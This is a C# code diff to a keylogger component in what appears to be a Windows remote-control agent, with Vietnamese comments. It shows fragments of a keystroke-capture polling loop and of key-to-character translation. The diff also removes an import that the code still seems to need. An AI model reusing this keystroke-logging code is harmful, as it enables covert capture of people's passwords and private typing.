@@ -1,9 +1,16 @@
+// -----------------------------------------------------------------------------
+// File: Keylogger.cs
+// Description:
+//      Định nghĩa dịch vụ theo dõi phím
+//
+//      Mục đích: Cung cấp chức năng theo dõi các thao tác trên bàn phím
+// -----------------------------------------------------------------------------
+
 using System;
 using System.Runtime.InteropServices;
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
-using System.Windows.Forms; // Cần cho Keys enum
 
 namespace RCS.Agent.Services.Windows
 {
@@ -106,7 +113,7 @@ namespace RCS.Agent.Services.Windows
                     }
                 }
 
-                // Delay ngắn để vòng lặp không chiếm 100% CPU nhưng vẫn đủ nhanh để bắt phím
+                // Delay ngắn nhưng vẫn đủ nhanh để bắt phím
                 await Task.Delay(20, token);
             }
         }
@@ -139,7 +146,7 @@ namespace RCS.Agent.Services.Windows
                 
                 if (key >= Keys.A && key <= Keys.Z)
                 {
-                    if (shift ^ caps) keyStr = key.ToString().ToUpper();
+                    if (shift ^ caps) keyStr = key.ToString(); // Already uppercase from Keys enum
                     else keyStr = key.ToString().ToLower();
                 }
                 else if (key >= Keys.D0 && key <= Keys.D9)
